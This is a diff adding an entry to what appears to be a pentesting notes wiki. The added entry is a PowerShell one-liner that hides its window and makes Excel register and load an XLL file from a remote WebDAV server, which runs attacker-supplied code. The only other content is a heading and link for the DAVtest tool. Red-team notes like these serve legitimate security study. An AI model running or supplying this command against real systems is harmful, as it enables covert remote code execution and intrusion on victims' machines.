@@ -1,4 +1,9 @@
 
+
+PowerShell one liner to load a xll file on a remote WebDAV server - [[DLL-Hijacking]]
+```powershell
+powershell -w hidden -c "iex ((new-object -ComObject excel.application).RegisterXLL('\\webdav\xll.xll'))"
+```
 #### DAVtest
 
 [[DAVtest]]
